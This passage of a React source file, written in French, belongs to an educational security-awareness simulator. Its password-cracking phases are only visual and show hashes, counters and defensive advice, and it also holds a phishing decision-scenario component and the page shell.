          {st.phase === 3 && (
            <motion.div key="phase3" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: 20, overflow: 'hidden' }}>
              <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.amber, marginBottom: 16, textTransform: 'uppercase' }}>
                [PHASE 3] Hashing & Rainbow Table
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                <div style={{ background: '#161b22', border: '1px solid #30363d', padding: 14 }}>
                  <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, marginBottom: 6, textTransform: 'uppercase' }}>Hash MD5</div>
                  <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.amber, wordBreak: 'break-all', lineHeight: 1.5 }}>{st.hashMD5 || '...'}</div>
                </div>
                <div style={{ background: '#161b22', border: '1px solid #30363d', padding: 14 }}>
                  <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, marginBottom: 6, textTransform: 'uppercase' }}>Hash SHA-256</div>
                  <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.amber, wordBreak: 'break-all', lineHeight: 1.5 }}>{st.hashSHA || '...'}</div>
                </div>
                {st.hashSHA && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ background: st.rainbowFound ? 'rgba(239,68,68,0.1)' : 'rgba(16,185,129,0.1)', border: `1px solid ${st.rainbowFound ? T.red : T.green}44`, padding: 14 }}>
                    <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, marginBottom: 6, textTransform: 'uppercase' }}>Recherche Rainbow Table</div>
                    {st.rainbowFound
                      ? <div style={{ color: T.red, fontFamily: T.MONO, fontSize: 11, fontWeight: 700 }}>⚠ HASH TROUVÉ dans la rainbow table — mot de passe récupéré !</div>
                      : <div style={{ color: T.green, fontFamily: T.MONO, fontSize: 11 }}>✓ Hash inconnu — rainbow table inefficace. Passage phase 4...</div>
                    }
                  </motion.div>
                )}
              </div>
            </motion.div>
          )}

          {/* PHASE 4 — Brute Force */}
          {st.phase === 4 && (
            <motion.div key="phase4" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 28, textAlign: 'center' }}>
              <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.amber, marginBottom: 20, textTransform: 'uppercase' }}>
                [PHASE 4] Brute Force — GPU cluster (10¹⁰ req/sec)
              </div>
              <div style={{ fontFamily: T.MONO, fontSize: 28, fontWeight: 800, color: T.red, marginBottom: 8 }}>
                {st.bruteCount.toLocaleString('fr-FR')}
              </div>
              <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.muted, marginBottom: 20 }}>tentatives</div>
              <div style={{ width: '100%', height: 4, background: '#30363d', marginBottom: 20 }}>
                <motion.div
                  animate={{ width: `${Math.min((st.bruteCount / 1e10) * 100 / 0.05, 100)}%` }}
                  style={{ height: '100%', background: T.red }}
                />
              </div>
              {!st.bruteDone && (
                <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.muted }}>
                  Estimation : {timeEst}
                </div>
              )}
            </motion.div>
          )}

          {/* PHASE 5 — Result */}
          {st.phase === 5 && (
            <motion.div key="phase5" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 28, textAlign: 'center', overflowY: 'auto' }}>
              {st.crackedAtPhase !== null ? (
                <>
                  <motion.div animate={{ opacity: [1, 0.4, 1] }} transition={{ repeat: Infinity, duration: 0.7 }}
                    style={{ fontSize: 52, marginBottom: 12 }}>💀</motion.div>
                  <div style={{ color: T.red, fontFamily: T.MONO, fontSize: 15, fontWeight: 800, marginBottom: 8 }}>
                    MOT DE PASSE COMPROMIS
                  </div>
                  <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.muted, marginBottom: 20 }}>
                    Cracké en phase {st.crackedAtPhase} —{' '}
                    {st.crackedAtPhase === 1 ? 'attaque dictionnaire' : st.crackedAtPhase === 2 ? 'mutation hashcat' : st.crackedAtPhase === 3 ? 'rainbow table' : 'brute force (entropie trop faible)'}
                  </div>
                  <div style={{ background: 'rgba(239,68,68,0.08)', border: `1px solid ${T.red}33`, padding: 16, width: '100%', maxWidth: 340, marginBottom: 20, textAlign: 'left' }}>
                    <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.red, textTransform: 'uppercase', marginBottom: 10 }}>Entropie : {entropy.toFixed(1)} bits</div>
                    {[
                      '1. Utilisez une passphrase : "MonChienS\'appelleMaxEtIlAdore2024!" (≥ 40 bits)',
                      '2. Gestionnaire de mots de passe : Bitwarden, 1Password, KeePass',
                      '3. Activez le MFA — même si le mot de passe est fort',
                    ].map((tip, i) => (
                      <div key={i} style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, marginBottom: 8, lineHeight: 1.5 }}>• {tip}</div>
                    ))}
                  </div>
                </>
              ) : (
                <>
                  <div style={{ fontSize: 52, marginBottom: 12 }}>🛡</div>
                  <div style={{ color: T.green, fontFamily: T.MONO, fontSize: 15, fontWeight: 800, marginBottom: 8 }}>
                    MOT DE PASSE RÉSISTANT
                  </div>
                  <div style={{ fontFamily: T.MONO, fontSize: 10, color: T.muted, marginBottom: 20 }}>
                    Temps de crack estimé : {timeEst}
                  </div>
                  <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', justifyContent: 'center', marginBottom: 20 }}>
                    {[
                      { label: '✓ Longueur', ok: st.password.length >= 12 },
                      { label: '✓ Complexité', ok: hasMaj && hasMin && hasNum },
                      { label: `✓ Entropie ${entropy.toFixed(0)} bits`, ok: entropy >= 55 },
                    ].map((badge, i) => badge.ok && (
                      <div key={i} style={{ fontFamily: T.MONO, fontSize: 9, color: T.green, background: 'rgba(16,185,129,0.1)', border: `1px solid ${T.green}44`, padding: '5px 10px' }}>
                        {badge.label}
                      </div>
                    ))}
                  </div>
                  <div style={{ background: 'rgba(16,185,129,0.08)', border: `1px solid ${T.green}33`, padding: 16, width: '100%', maxWidth: 340, marginBottom: 20, textAlign: 'left' }}>
                    {[
                      '1. Continuez à utiliser un gestionnaire de mots de passe',
                      '2. Activez le MFA en complément — même les forts mots de passe peuvent fuiter',
                      '3. Vérifiez vos comptes sur haveibeenpwned.com',
                    ].map((tip, i) => (
                      <div key={i} style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, marginBottom: 8, lineHeight: 1.5 }}>• {tip}</div>
                    ))}
                  </div>
                </>
              )}
              <motion.button
                whileHover={{ scale: 1.02 }}
                onClick={resetAll}
                style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '11px 24px', background: T.blue, color: '#fff', border: 'none', cursor: 'pointer', fontFamily: T.MONO, fontSize: 11, fontWeight: 600 }}
              >
                <RotateCcw size={12} /> Tester un nouveau mot de passe
              </motion.button>
            </motion.div>
          )}

        </AnimatePresence>
      </div>

      {/* RIGHT — Narration */}
      <div style={{ display: 'flex', flexDirection: 'column', overflow: 'hidden', background: T.bg }}>
        <div style={{ flex: 1, overflowY: 'auto', padding: '24px 24px 0' }}>
          <div style={{ marginBottom: 18 }}>
            <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', letterSpacing: '0.1em' }}>{currentNarration.chapter}</span>
            <h2 style={{ fontFamily: T.SANS, fontWeight: 800, fontSize: '1.1rem', letterSpacing: '-0.03em', color: T.text, margin: '5px 0 0', lineHeight: 1.25 }}>{currentNarration.title}</h2>
          </div>

          {st.phase < 5 && (
            <div style={{ marginBottom: 22 }}>
              {currentNarration.story.map((para, i) => {
                const parts = para.split(/\*\*(.*?)\*\*/g);
                return (
                  <p key={i} style={{ fontSize: 13, color: T.sub, lineHeight: 1.75, margin: '0 0 10px' }}>
                    {parts.map((part, j) => j % 2 === 1
                      ? <strong key={j} style={{ color: T.text, fontWeight: 600 }}>{part}</strong>
                      : <span key={j}>{part}</span>
                    )}
                  </p>
                );
              })}
            </div>
          )}

          {currentNarration.knowledge.length > 0 && st.phase < 5 && (
            <div style={{ marginBottom: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 10 }}>
                <Info size={10} color={T.blue} />
                <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.blue }}>À RETENIR</span>
              </div>
              <KnowledgePanel cards={currentNarration.knowledge} />
            </div>
          )}

          {st.phase === 5 && (
            <div style={{ marginBottom: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 10 }}>
                <Info size={10} color={T.blue} />
                <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.blue }}>RÉCAPITULATIF</span>
              </div>
              <div style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.7 }}>
                <p style={{ margin: '0 0 10px' }}>Les 4 phases d'attaque simulées correspondent aux vraies techniques utilisées par les attaquants, dans l'ordre de rapidité croissante.</p>
                <p style={{ margin: '0 0 10px' }}>Un bon mot de passe doit résister à toutes ces phases. La clé : <strong style={{ color: T.text }}>longueur + aléatoire + unicité</strong>.</p>
              </div>
              <KnowledgePanel cards={[
                { term: 'Passphrase (diceware)', definition: 'Méthode EFF : choisir 4 à 6 mots aléatoires au dé. "correct-horse-battery-staple" : 44 bits d\'entropie, mémorisable, résistant.', example: 'Outils : diceware.com, passgenerator.fr. Beaucoup plus sûr et mémorisable que "P@ssw0rd2024!".', law: 'NIST SP 800-63B (2024) recommande les passphrases longues plutôt que les contraintes de complexité.' },
                { term: 'Gestionnaire de mots de passe', definition: 'Génère et stocke des mots de passe uniques et aléatoires pour chaque site. Vous ne retenez qu\'un seul mot de passe maître.', example: 'Bitwarden (open source, gratuit), 1Password, KeePass (local). Tous chiffrent les coffres avec AES-256.', law: 'L\'ANSSI et la CNIL recommandent officiellement les gestionnaires de mots de passe depuis 2021.' },
              ]} />
            </div>
          )}
        </div>

        {/* Bottom — reset button for password scenario */}
        <div style={{ borderTop: `1px solid ${T.line}`, padding: '14px 24px', background: T.bg, flexShrink: 0 }}>
          <motion.button
            whileHover={{ scale: 1.01 }}
            onClick={resetAll}
            style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, padding: '10px 0', background: T.surface, border: `1px solid ${T.line}`, cursor: 'pointer', fontFamily: T.MONO, fontSize: 10, color: T.sub }}
          >
            <RotateCcw size={11} /> Réinitialiser le simulateur
          </motion.button>
        </div>
      </div>
    </div>
  );
}

// ─── Phishing Scenario Component ───────────────────────────────────────────────

function PhishingScenario() {
  const [actIndex, setActIndex] = useState(0);
  const [choices, setChoices] = useState<Record<string, string>>({});
  const [stageStates, setStageStates] = useState<Record<string, StageState>>({});
  const [feedbacks, setFeedbacks] = useState<Record<string, { correct: boolean; text: string }>>({});

  const stages = buildStages(choices);
  const stage = stages[actIndex];
  const isLast = actIndex === stages.length - 1;
  const currentState: StageState = stageStates[stage.id] || 'waiting';
  const canAdvance = currentState === 'correct' || currentState === 'wrong' || currentState === 'auto';

  const handleAction = (actionId: string) => {
    if (currentState !== 'waiting') return;
    const isCorrect = actionId === stage.correctAction;
    const isWrong = stage.wrongActions?.includes(actionId);

    if (isCorrect) {
      setStageStates(prev => ({ ...prev, [stage.id]: 'correct' }));
      setChoices(prev => ({ ...prev, [stage.id]: actionId }));
      setFeedbacks(prev => ({ ...prev, [stage.id]: { correct: true, text: stage.correctFeedback } }));
    } else if (isWrong) {
      setStageStates(prev => ({ ...prev, [stage.id]: 'wrong' }));
      setChoices(prev => ({ ...prev, [stage.id]: actionId }));
      if (stage.wrongFeedback) {
        setFeedbacks(prev => ({ ...prev, [stage.id]: { correct: false, text: stage.wrongFeedback! } }));
      }
    }
  };

  const advance = () => {
    if (!isLast) setActIndex(i => i + 1);
    else {
      setActIndex(0);
      setChoices({});
      setStageStates({});
      setFeedbacks({});
    }
  };

  const ScreenComp = stage.screen;
  const feedback = feedbacks[stage.id];

  return (
    <div style={{ flex: 1, display: 'grid', gridTemplateColumns: '1fr 400px', overflow: 'hidden' }}>
      {/* LEFT */}
      <div style={{ borderRight: `1px solid ${T.line}`, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        {stage.instruction && (
          <div style={{ borderBottom: `1px solid ${T.line}`, padding: '8px 20px', background: T.surface, flexShrink: 0 }}>
            <span style={{ fontFamily: T.MONO, fontSize: 10, color: T.blue }}>{stage.instruction}</span>
          </div>
        )}
        <div style={{ flex: 1, overflow: 'hidden' }}>
          <AnimatePresence mode="wait">
            <motion.div key={stage.id} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.25 }} style={{ height: '100%' }}>
              <ScreenComp onAction={handleAction} state={currentState} />
            </motion.div>
          </AnimatePresence>
        </div>
        <AnimatePresence>
          {feedback && (
            <motion.div
              initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }}
              style={{ borderTop: `2px solid ${feedback.correct ? T.green : T.red}`, background: feedback.correct ? 'rgba(16,185,129,0.05)' : 'rgba(239,68,68,0.05)', padding: '12px 20px', flexShrink: 0 }}
            >
              <div style={{ display: 'flex', gap: 10, alignItems: 'flex-start' }}>
                {feedback.correct ? <CheckCircle size={14} color={T.green} style={{ flexShrink: 0, marginTop: 1 }} /> : <XCircle size={14} color={T.red} style={{ flexShrink: 0, marginTop: 1 }} />}
                <div>
                  <span style={{ fontFamily: T.MONO, fontSize: 9, fontWeight: 700, color: feedback.correct ? T.green : T.red, textTransform: 'uppercase', letterSpacing: '0.06em', display: 'block', marginBottom: 4 }}>
                    {feedback.correct ? '✓ Bonne décision' : '✗ Mauvaise décision'}
                  </span>
                  <span style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.6 }}>{feedback.text}</span>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* RIGHT */}
      <div style={{ display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        <div style={{ flex: 1, overflowY: 'auto', padding: '24px 24px 0' }}>
          <div style={{ marginBottom: 18 }}>
            <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', letterSpacing: '0.1em' }}>{stage.chapter}</span>
            <h2 style={{ fontFamily: T.SANS, fontWeight: 800, fontSize: '1.1rem', letterSpacing: '-0.03em', color: T.text, margin: '5px 0 0', lineHeight: 1.25 }}>{stage.title}</h2>
          </div>
          <div style={{ marginBottom: 22 }}>
            {stage.story.map((para, i) => {
              const parts = para.split(/\*\*(.*?)\*\*/g);
              return (
                <p key={i} style={{ fontSize: 13, color: T.sub, lineHeight: 1.75, margin: '0 0 10px' }}>
                  {parts.map((part, j) => j % 2 === 1
                    ? <strong key={j} style={{ color: T.text, fontWeight: 600 }}>{part}</strong>
                    : <span key={j}>{part}</span>
                  )}
                </p>
              );
            })}
          </div>
          {stage.knowledge && (
            <div style={{ marginBottom: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 10 }}>
                <Info size={10} color={T.blue} />
                <span style={{ fontFamily: T.MONO, fontSize: 9, textTransform: 'uppercase', letterSpacing: '0.1em', color: T.blue }}>À RETENIR</span>
              </div>
              <KnowledgePanel cards={stage.knowledge} />
            </div>
          )}
        </div>
        <div style={{ borderTop: `1px solid ${T.line}`, padding: '14px 24px', display: 'flex', gap: 10, alignItems: 'center', background: T.bg, flexShrink: 0 }}>
          <button
            onClick={() => actIndex > 0 && setActIndex(i => i - 1)}
            disabled={actIndex === 0}
            style={{ display: 'flex', alignItems: 'center', gap: 5, padding: '8px 12px', background: T.surface, border: `1px solid ${T.line}`, cursor: actIndex === 0 ? 'not-allowed' : 'pointer', opacity: actIndex === 0 ? 0.35 : 1, fontFamily: T.MONO, fontSize: 10, color: T.sub }}
          >
            <ChevronLeft size={11} /> Précédent
          </button>
          <motion.button
            onClick={advance}
            disabled={!canAdvance}
            whileHover={canAdvance ? { scale: 1.02 } : {}}
            style={{
              flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
              padding: '10px 16px',
              background: canAdvance ? T.blue : T.surface,
              color: canAdvance ? '#fff' : T.muted,
              border: canAdvance ? 'none' : `1px solid ${T.line}`,
              cursor: canAdvance ? 'pointer' : 'not-allowed',
              fontFamily: T.MONO, fontSize: 11, fontWeight: 600,
            }}
          >
            {!canAdvance ? (
              <><motion.span animate={{ opacity: [1, 0.3] }} transition={{ repeat: Infinity, duration: 0.9 }}>●</motion.span> Interagissez avec l'écran</>
            ) : isLast ? (
              <><RotateCcw size={12} /> Recommencer</>
            ) : (
              <>Acte suivant <ChevronRight size={12} /></>
            )}
          </motion.button>
        </div>
      </div>
    </div>
  );
}

// ─── Main ──────────────────────────────────────────────────────────────────────

type Scenario = 'phishing' | 'password';

export default function AttackSimulator() {
  const [, navigate] = useLocation();
  const [scenario, setScenario] = useState<Scenario>('phishing');
  const [scenarioKey, setScenarioKey] = useState(0);

  const switchScenario = (s: Scenario) => {
    if (s === scenario) return;
    setScenario(s);
    setScenarioKey(k => k + 1);
  };

  const scenarios: { id: Scenario; label: string }[] = [
    { id: 'phishing', label: 'PHISHING → RANSOMWARE' },
    { id: 'password', label: 'CRACKING DE MOT DE PASSE' },
  ];

  return (
    <div style={{ height: '100vh', display: 'flex', flexDirection: 'column', background: T.bg, fontFamily: T.SANS, color: T.text, overflow: 'hidden' }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #e8eaed; border-radius: 2px; }
      `}</style>

      {/* Top bar */}
      <div style={{ borderBottom: `1px solid ${T.line}`, padding: '10px 28px', display: 'flex', alignItems: 'center', gap: 14, background: T.bg, flexShrink: 0 }}>
        <button onClick={() => navigate('/cyber/sas-academie')} style={{ display: 'flex', alignItems: 'center', gap: 5, background: 'none', border: 'none', cursor: 'pointer', color: T.muted, fontSize: 10, fontFamily: T.MONO, padding: 0 }}>
          <ChevronLeft size={11} /> Retour
        </button>
        <div style={{ width: 1, height: 14, background: T.line }} />
        <Shield size={13} color={T.blue} />
        <span style={{ fontFamily: T.MONO, fontSize: 10, color: T.blue, textTransform: 'uppercase', letterSpacing: '0.1em' }}>Simulateur d'attaque</span>

        {/* Scenario selector */}
        <div style={{ display: 'flex', gap: 1, background: T.line, padding: 1, marginLeft: 8 }}>
          {scenarios.map(s => (
            <button
              key={s.id}
              onClick={() => switchScenario(s.id)}
              style={{
                padding: '6px 14px',
                background: scenario === s.id ? T.bg : T.surface,
                border: 'none',
                borderBottom: scenario === s.id ? `2px solid ${T.blue}` : '2px solid transparent',
                cursor: 'pointer',
                fontFamily: T.MONO,
                fontSize: 9,
                fontWeight: scenario === s.id ? 700 : 400,
                color: scenario === s.id ? T.blue : T.muted,
                letterSpacing: '0.06em',
                transition: 'all 0.15s',
                whiteSpace: 'nowrap',
              }}
            >
              {s.label}
            </button>
          ))}
        </div>
      </div>

      {/* Body */}
      <AnimatePresence mode="wait">
        <motion.div
          key={scenarioKey}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 0.2 }}
          style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}
        >
          {scenario === 'phishing' ? <PhishingScenario /> : <PasswordScenario />}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
